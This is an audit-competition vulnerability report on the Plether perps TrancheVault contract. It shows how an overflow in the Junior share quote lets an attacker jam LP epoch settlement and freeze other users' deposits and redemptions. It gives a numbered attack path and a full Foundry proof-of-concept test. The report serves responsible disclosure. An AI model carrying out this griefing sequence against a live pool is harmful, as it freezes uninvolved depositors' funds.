# \#99490 [SC-High] Positive Junior NAV permits share-supply overflow that blocks LP epoch settlement

**Submitted on Nov 13th 2026 at 21:25:37 UTC by @Paludo0x for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99490
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro

Junior deposits are admitted whenever projected tranche NAV is positive, even when the existing share supply makes the next valid deposit quote exceed `uint256`. The quote reverts inside the atomic LP epoch transition, so an accepted Junior request can block unrelated LP funding while its owner leaves it queued.

## Vulnerability Details

### Affected code and root cause

The affected production source is the competition's frozen commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. The Junior vault's [request limit](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1313-L1326) has no supply-aware bound:

```solidity
if (_isTerminallyWiped() || !POOL.canAcceptTrancheDeposits(IS_SENIOR)) {
    return 0;
}
if (IS_SENIOR) {
    return _seniorDepositCapacity();
}
return type(uint256).max;
```

The projected wipe predicate only rejects exactly zero pricing assets: [TrancheVault.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1639-L1647).

```solidity
function _projectedTerminalWipe() internal view returns (bool) {
    (uint256 seniorPricingAssets, uint256 juniorPricingAssets) = POOL.getPendingDepositTrancheState();
    uint256 pricingAssets = IS_SENIOR ? seniorPricingAssets : juniorPricingAssets;
    return totalSupply() > 0 && pricingAssets == 0;
}
```

As Senior coupon transfers value out of Junior, a positive dust NAV gives a large share quote. Each successful deposit adds those shares to the next quote's `pricingSupply`. [TrancheVault.quoteDepositFromState](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1398-L1410) applies no check that the quote and resulting supply remain representable:

```solidity
uint256 netAssets = feeBps == 0 ? assets : Math.mulDiv(assets, BPS - feeBps, BPS, Math.Rounding.Floor);
uint256 denominator = pricingAssets + assets + 1 - netAssets;
shares = Math.mulDiv(netAssets, pricingSupply + VIRTUAL_SHARES, denominator, Math.Rounding.Floor);
```

The [HousePool deposit phase](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1030-L1097) calls that quote for the matured queue head after redemption processing begins:

```solidity
(uint256 epochId, uint256 epochAssets) = vault.getMaturedDepositHead(cutoffEpoch);
if (epochAssets == 0) {
    break;
}
uint256 cumulativeShares = vault.quoteDepositFromState(
    phase.acceptedAssets + epochAssets, phase.pricingAssets, phase.pricingSupply, feeBps
);
```

An arithmetic panic rolls back the entire settlement, including unrelated redemption funding. The accepted Junior depositor also cannot refund a matured request while projected NAV remains positive: [TrancheVault.cancelPendingDeposit](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L833-L860).

```solidity
if (
    (IS_SENIOR || currentLpEpoch() >= requestId) && !queueState.rejected
        && (!IS_SENIOR || !POOL.lpEpochSettlementPaused()) && !_projectedTerminalWipe()
        && !POOL.isSeniorImpairedAfterPendingDepositReconcile()
) {
    if (IS_SENIOR) {
        revert TrancheVault__SeniorDepositCommitted();
    }
    revert TrancheVault__DepositEpochAlreadyActive();
}
```

The Senior LP cannot reclaim shares from a matured but unfunded redemption request either: [TrancheVault.cancelRedeemRequest](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L884-L899).

```solidity
if (currentLpEpoch() >= requestId || epoch.fundedShares != 0 || epoch.fundedAssets != 0 || epoch.refundEnabled)
{
    revert TrancheVault__RedeemCancellationUnavailable();
}
```

### Attack path

1. Once the configured Senior coupon has reduced Junior NAV to positive dust, an ordinary Junior LP requests a deposit before an epoch boundary. The protocol accepts the request because NAV remains positive.
2. At the first mature block, any permissionless caller settles the epoch. The near-zero denominator mints a large but representable number of Junior shares. Repeated ordinary deposits increase the share supply without changing code or configuration.
3. After sufficient supply growth and while unrelated LP requests are already queued, the attacker adds a Junior deposit to the same epoch. This request passes `maxRequestDeposit` and escrows USDG, but the epoch's cumulative quote exceeds representable supply at settlement.
4. While ordinary deposit activation is enabled, settlement reverts with arithmetic panic. Unrelated Senior redemption funding and Junior deposit activation in that transition roll back. The Junior victim cannot cancel while projected NAV remains positive, and the Senior LP cannot cancel a matured redemption.
5. The oracle-frozen settlement path defers deposit activation and can fund the Senior redemption without touching the overflowing quote. The Junior escrow remains unclaimable and nonrefundable while its projected NAV is positive; a later terminal wipe permits its refund.

## Impact Details

**Selected impact: Temporary freezing of funds for at least 24 hours.** A Junior LP's accepted USDG request remains in vault escrow with neither activated shares nor an available refund. During live-market deposit activation, the arithmetic revert also rolls back unrelated Senior redemption funding; the matured Senior request cannot be canceled to reclaim its escrowed shares. The affected pool holds cash; the failure is in share quoting and atomic epoch settlement, not token availability.


## Proof of Concept

## PoC Explanation

Attach the single file `PletherJuniorEpochShareOverflow.t.sol` at `packages/perps/test/perps/spec/` in a checkout of the frozen commit. From `packages/perps`, run:

```sh
forge test --match-path test/perps/spec/PletherJuniorEpochShareOverflow.t.sol --match-test test_CouponOnlyShareOverflowBlocksUnrelatedLpFunds -vv
```

The test uses the repository's `BasePerpTest`, MockUSDG and six-feed MockPyth fixture; it configures the release basket, risk values and Senior limits. Initial LP funding is 200,001 USDG Junior and 790,001 USDG Senior, with a timing deposit of 4.7225 USDG. It advances about 3.2 years to a Junior NAV dust boundary under the default 8% Senior coupon, then makes 39 sequential public Junior deposit/claim cycles totaling 354.302136 USDG. Each request matures at an hour boundary; an unrelated `KEEPER` settles every cycle at the first eligible timestamp, with a positive-NAV window of 69–321 seconds after that boundary. The basket mark is flat during the share-supply sequence, and no position is open. Two public flat-mark trading rounds create fee revenue. An unrelated Junior LP then escrows 100 USDG and an unrelated Senior LP requests redemption; the attacker subsequently joins that epoch with a 400 USDG request.

The control branch, without the jam request, funds the Junior deposit and Senior redemption at the same time and NAV. The attack branch has the same projected Junior NAV and share supply, but the combined 500 USDG deposit epoch quotes about 1.08 times `uint256` maximum. It expects `Panic(0x11)` from `TrancheVault.quoteDepositFromState`; both unrelated requests remain unfunded even though the vault holds the escrowed USDG. A retry 24 hours later still panics in the live market; the Junior victim cannot cancel its 100 USDG deposit, and the Senior LP cannot cancel its matured redemption. At the oracle-frozen weekend timestamp four days after the jam, a permissionless settlement funds the Senior redemption while deferring deposits; the Junior request remains unclaimable and nonrefundable. At the later 30-day fixture timestamp, projected Junior NAV has reached zero and the victim successfully refunds the 100 USDG request. The test passes 1/1 on the frozen commit. A prior negative control using the wrong expected panic code failed with a nonzero exit status.

The time warp, starting LP balances and fee-generating trades are fixture choices. MockPyth supplies local signed-feed stand-ins; the share-inflation phase uses the permissionless cached-mark path with no open positions and does not depend on a price movement. The test does not reconstruct a live pool's multi-year operating history or measure how often the near-zero-NAV state would occur. The 30-day refund is a separate recovery check, not a claim of a 30-day continuous freeze.

```
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// One-file PoC for the audited Plether commit. Uses only repository test helpers.
import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

contract PletherJuniorEpochShareOverflow is BasePerpTest {

    address internal constant ENTRANT = address(0xE177);
    address internal constant INCUMBENT = address(0x1C0B);
    address internal constant SMALL_INCUMBENT = address(0x5A11);
    address internal constant SENIOR_LP = address(0x5E11);
    address internal constant TRADER = address(0x7AD3);
    address internal constant KEEPER = address(0xBEEF);
    address internal constant BENIGN_LP = address(0xBADA55);
    uint256 internal constant MARK = 1e8;

    bytes32[6] internal releaseIds = [
        bytes32(0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b),
        bytes32(0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52),
        bytes32(0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1),
        bytes32(0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca),
        bytes32(0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676),
        bytes32(0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8)
    ];
    uint256[6] internal releaseWeights = [uint256(576e15), 136e15, 119e15, 91e15, 42e15, 36e15];
    uint256[6] internal releaseBases =
        [uint256(117_500_000), 638_000, 134_480_000, 72_880_000, 10_860_000, 126_100_000];
    bool[6] internal releaseInverted = [false, true, false, true, true, true];

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1_000_000,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        bytes32[] memory ids = new bytes32[](6);
        uint256[] memory weights = new uint256[](6);
        uint256[] memory bases = new uint256[](6);
        bool[] memory inversions = new bool[](6);
        for (uint256 i; i < 6; ++i) {
            ids[i] = releaseIds[i];
            weights[i] = releaseWeights[i];
            bases[i] = releaseBases[i];
            inversions[i] = releaseInverted[i];
        }
        PletherOracle releaseOracle =
            new PletherOracle(address(engine), address(pool), address(baseMockPyth), ids, weights, bases, inversions);
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2500;
        config.minOpenNotionalAssets = 1000e6;
        config.positionProtectionTriggerBountyAssets = 200_000;
        routerAdmin.proposeRouterConfig(config);
        routerAdmin.proposeOracleConfig(IOrderRouterAdminHost.OracleConfig(address(releaseOracle)));
        vm.warp(routerAdmin.oracleConfigActivationTime());
        routerAdmin.finalizeOracleConfig();
        routerAdmin.finalizeRouterConfig();
        pletherOracle = releaseOracle;
        _setSeniorCapacity(40_000_000e6, 8000);

        uint256 day = vm.getBlockTimestamp() / 1 days + 1;
        while ((day + 4) % 7 != 1) {
            ++day;
        }
        vm.warp(day * 1 days + 6 hours);
        _mark(MARK);
        _deposit(juniorVault, INCUMBENT, 199_000e6);
        _deposit(juniorVault, SMALL_INCUMBENT, 1000e6);
        _deposit(seniorVault, SENIOR_LP, 790_000e6);
        _fundTrader(TRADER, 100_000e6);
    }

    function _pyth(
        uint256 targetMark
    ) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime =
            router.nextExecuteId() < router.nextCommitId() ? _mockHistoricalPublishTime() : vm.getBlockTimestamp();
        MockPyth.FeedUpdate[] memory feeds = new MockPyth.FeedUpdate[](6);
        for (uint256 i; i < 6; ++i) {
            uint256 raw =
                releaseInverted[i] ? 1e24 / (releaseBases[i] * targetMark) : releaseBases[i] * targetMark / 1e8;
            feeds[i] = MockPyth.FeedUpdate(
                releaseIds[i],
                MockPyth.MockPrice(
                    int64(uint64(raw)), uint64(raw / 10_000), -8, publishTime, publishTime == 0 ? 0 : publishTime - 1
                )
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(feeds);
    }

    function _mark(
        uint256 targetMark
    ) internal {
        bytes[] memory data = _pyth(targetMark);
        vm.prank(KEEPER);
        router.updateMarkPrice(data);
    }

    function _deposit(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        uint256 id = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        uint256 maturity = pool.lpEpochStart(id);
        if (vm.getBlockTimestamp() < maturity) {
            vm.warp(maturity);
        }
        bytes[] memory data = _pyth(MARK);
        vm.prank(lp);
        router.settleLpEpoch(data);
        assertEq(vault.claimableDepositRequest(id, lp), amount);
        vm.prank(lp);
        vault.claimDeposit(id, amount, lp, lp);
    }

    function _commit(
        address account,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal returns (uint64 id) {
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(router.nextCommitId())),
            side: CfdTypes.Side.SHORT,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: isClose ? 1 : type(uint256).max,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp()) + uint64(router.maxExecutionWindowSeconds()),
                executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(account);
        id = router.commitOrder(request);
    }

    function _projected() internal view returns (uint256 senior, uint256 junior) {
        (senior, junior) = pool.getPendingDepositTrancheState();
    }

    function _settleCached(
        address caller
    ) internal {
        vm.prank(caller);
        pool.settleLpEpoch(0, 0);
    }

    function _requestVictimFunds() internal returns (uint256 juniorId, uint256 seniorId) {
        settlementToken.mint(BENIGN_LP, 100e6);
        vm.startPrank(BENIGN_LP);
        settlementToken.approve(address(juniorVault), 100e6);
        juniorId = juniorVault.requestDeposit(100e6, BENIGN_LP, BENIGN_LP);
        vm.stopPrank();
        uint256 shares = seniorVault.maxRequestRedeem(SENIOR_LP) / 4;
        vm.prank(SENIOR_LP);
        seniorId = seniorVault.requestRedeem(shares, SENIOR_LP, SENIOR_LP);
    }

    function _expectArithmeticPanic() internal {
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", 0x11));
        pool.settleLpEpoch(0, 0);
    }

    function _payTradingFees() internal {
        _mark(MARK);
        uint256 notional = pool.totalAssets() * 399 / 1000;
        uint256 size = (notional * 1e20 / MARK) / 1e20 * 1e20;
        uint64 openId = _commit(TRADER, size, notional / 10, false);
        bytes[] memory data = _pyth(MARK);
        vm.prank(TRADER);
        router.executeOrder(openId, data);
        uint64 closeId = _commit(TRADER, size, 0, true);
        data = _pyth(MARK);
        vm.prank(TRADER);
        router.executeOrder(closeId, data);
    }

    function _lastPositiveSecond(
        uint256 start
    ) internal returns (uint256 second) {
        uint256 root = vm.snapshotState();
        uint256 lo = start;
        uint256 hi = start + 10 * 365 days;
        for (uint256 i; i < 33; ++i) {
            uint256 mid = (lo + hi + 1) / 2;
            assertTrue(vm.revertToState(root));
            root = vm.snapshotState();
            vm.warp(mid);
            (, uint256 junior) = _projected();
            if (junior > 0) {
                lo = mid;
            } else {
                hi = mid - 1;
            }
        }
        assertTrue(vm.revertToState(root));
        second = lo;
    }

    function test_CouponOnlyShareOverflowBlocksUnrelatedLpFunds() public {
        _deposit(juniorVault, ENTRANT, 4_722_500);
        uint256 cumulativeGrowthDeposits;
        uint256 minPositiveWindow = type(uint256).max;
        uint256 maxPositiveWindow;
        for (uint256 cycle = 1; cycle <= 39; ++cycle) {
            uint256 last = _lastPositiveSecond(vm.getBlockTimestamp());
            if (cycle == 1) {
                emit log_named_uint("first_coupon_dust_timestamp", last);
            }
            vm.warp(last - 30 minutes);
            (uint256 senior,) = _projected();
            uint256 amount = cycle == 38
                ? senior * pool.seniorRateBps() * 2 hours / (10_000 * 365 days) + 545_000
                : cycle == 39 ? 1e6 : senior * pool.seniorRateBps() * 1 hours / (10_000 * 365 days) + 2500;
            cumulativeGrowthDeposits += amount;
            assertEq(juniorVault.maxRequestDeposit(ENTRANT), type(uint256).max);
            settlementToken.mint(ENTRANT, amount);
            vm.startPrank(ENTRANT);
            settlementToken.approve(address(juniorVault), amount);
            uint256 id = juniorVault.requestDeposit(amount, ENTRANT, ENTRANT);
            vm.stopPrank();
            assertLe(pool.lpEpochStart(id), last - 1);
            assertLe(last - 1 - pool.lpEpochStart(id), 3599);
            uint256 positiveWindow = last - pool.lpEpochStart(id);
            assertGe(positiveWindow, 60);
            if (positiveWindow < minPositiveWindow) {
                minPositiveWindow = positiveWindow;
            }
            if (positiveWindow > maxPositiveWindow) {
                maxPositiveWindow = positiveWindow;
            }
            vm.warp(pool.lpEpochStart(id));
            (, uint256 junior) = _projected();
            assertGt(junior, 0);
            _settleCached(KEEPER);
            assertEq(juniorVault.claimableDepositRequest(id, ENTRANT), amount);
            vm.prank(ENTRANT);
            juniorVault.claimDeposit(id, amount, ENTRANT, ENTRANT);
        }
        emit log_named_uint("growth_deposits_total", cumulativeGrowthDeposits);
        emit log_named_uint("minimum_positive_window_seconds", minPositiveWindow);
        emit log_named_uint("maximum_positive_window_seconds", maxPositiveWindow);
        emit log_named_uint("supply_after_growth", juniorVault.totalSupply());

        (, uint256 juniorBeforeFees) = _projected();
        _payTradingFees();
        _payTradingFees();
        (, uint256 juniorAfterFees) = _projected();
        emit log_named_uint("junior_before_fees", juniorBeforeFees);
        emit log_named_uint("junior_after_fees", juniorAfterFees);

        uint256 root = vm.snapshotState();
        (uint256 controlJuniorId, uint256 controlSeniorId) = _requestVictimFunds();
        uint256 cutoff = pool.lpEpochStart(controlJuniorId);
        if (pool.lpEpochStart(controlSeniorId) > cutoff) {
            cutoff = pool.lpEpochStart(controlSeniorId);
        }
        vm.warp(cutoff);
        (, uint256 controlJuniorNav) = _projected();
        _settleCached(BENIGN_LP);
        assertEq(juniorVault.claimableDepositRequest(controlJuniorId, BENIGN_LP), 100e6);
        assertGt(seniorVault.claimableRedeemRequest(controlSeniorId, SENIOR_LP), 0);
        emit log_named_uint("control_junior_funded", juniorVault.claimableDepositRequest(controlJuniorId, BENIGN_LP));
        emit log_named_uint(
            "control_senior_funded_shares", seniorVault.claimableRedeemRequest(controlSeniorId, SENIOR_LP)
        );

        assertTrue(vm.revertToState(root));
        (uint256 victimJuniorId, uint256 victimSeniorId) = _requestVictimFunds();
        uint256 jamAmount = 400e6;
        settlementToken.mint(ENTRANT, jamAmount);
        vm.startPrank(ENTRANT);
        settlementToken.approve(address(juniorVault), jamAmount);
        uint256 jamId = juniorVault.requestDeposit(jamAmount, ENTRANT, ENTRANT);
        vm.stopPrank();
        cutoff = pool.lpEpochStart(jamId);
        if (pool.lpEpochStart(victimJuniorId) > cutoff) {
            cutoff = pool.lpEpochStart(victimJuniorId);
        }
        if (pool.lpEpochStart(victimSeniorId) > cutoff) {
            cutoff = pool.lpEpochStart(victimSeniorId);
        }
        vm.warp(cutoff);
        (, uint256 juniorBeforeJam) = _projected();
        assertEq(juniorBeforeJam, controlJuniorNav);
        assertGt(juniorBeforeJam, 0);
        _expectArithmeticPanic();
        assertEq(juniorVault.claimableDepositRequest(victimJuniorId, BENIGN_LP), 0);
        assertEq(seniorVault.claimableRedeemRequest(victimSeniorId, SENIOR_LP), 0);
        assertGe(settlementToken.balanceOf(address(juniorVault)), jamAmount + 100e6);
        emit log_named_uint("junior_before_jam", juniorBeforeJam);
        emit log_named_uint("jammed_supply", juniorVault.totalSupply());

        uint256 jamTimestamp = vm.getBlockTimestamp();
        vm.warp(jamTimestamp + 24 hours);
        assertFalse(engine.isOracleFrozen());
        _expectArithmeticPanic();
        assertEq(juniorVault.claimableDepositRequest(victimJuniorId, BENIGN_LP), 0);
        assertEq(seniorVault.claimableRedeemRequest(victimSeniorId, SENIOR_LP), 0);
        vm.prank(BENIGN_LP);
        vm.expectRevert(TrancheVault.TrancheVault__DepositEpochAlreadyActive.selector);
        juniorVault.cancelPendingDeposit(victimJuniorId, BENIGN_LP, BENIGN_LP);
        vm.prank(SENIOR_LP);
        vm.expectRevert(TrancheVault.TrancheVault__RedeemCancellationUnavailable.selector);
        seniorVault.cancelRedeemRequest(victimSeniorId, SENIOR_LP, SENIOR_LP);

        vm.warp(jamTimestamp + 4 days);
        assertTrue(engine.isOracleFrozen());
        _settleCached(KEEPER);
        assertGt(seniorVault.claimableRedeemRequest(victimSeniorId, SENIOR_LP), 0);
        assertEq(juniorVault.claimableDepositRequest(victimJuniorId, BENIGN_LP), 0);
        vm.prank(BENIGN_LP);
        vm.expectRevert(TrancheVault.TrancheVault__DepositEpochAlreadyActive.selector);
        juniorVault.cancelPendingDeposit(victimJuniorId, BENIGN_LP, BENIGN_LP);
        emit log_named_uint(
            "senior_funded_by_permissionless_frozen_settlement",
            seniorVault.claimableRedeemRequest(victimSeniorId, SENIOR_LP)
        );

        vm.warp(jamTimestamp + 30 days);
        _mark(MARK);
        assertFalse(engine.isOracleFrozen());
        (, uint256 juniorAfterWeekend30d) = _projected();
        assertEq(juniorAfterWeekend30d, 0);
        emit log_named_uint("junior_nav_after_weekend_30d", juniorAfterWeekend30d);
        uint256 balanceBeforeRefund = settlementToken.balanceOf(BENIGN_LP);
        vm.prank(BENIGN_LP);
        juniorVault.cancelPendingDeposit(victimJuniorId, BENIGN_LP, BENIGN_LP);
        assertEq(settlementToken.balanceOf(BENIGN_LP) - balanceBeforeRefund, 100e6);
        emit log_named_uint("junior_refunded_after_terminal_wipe", 100e6);
    }

}

```
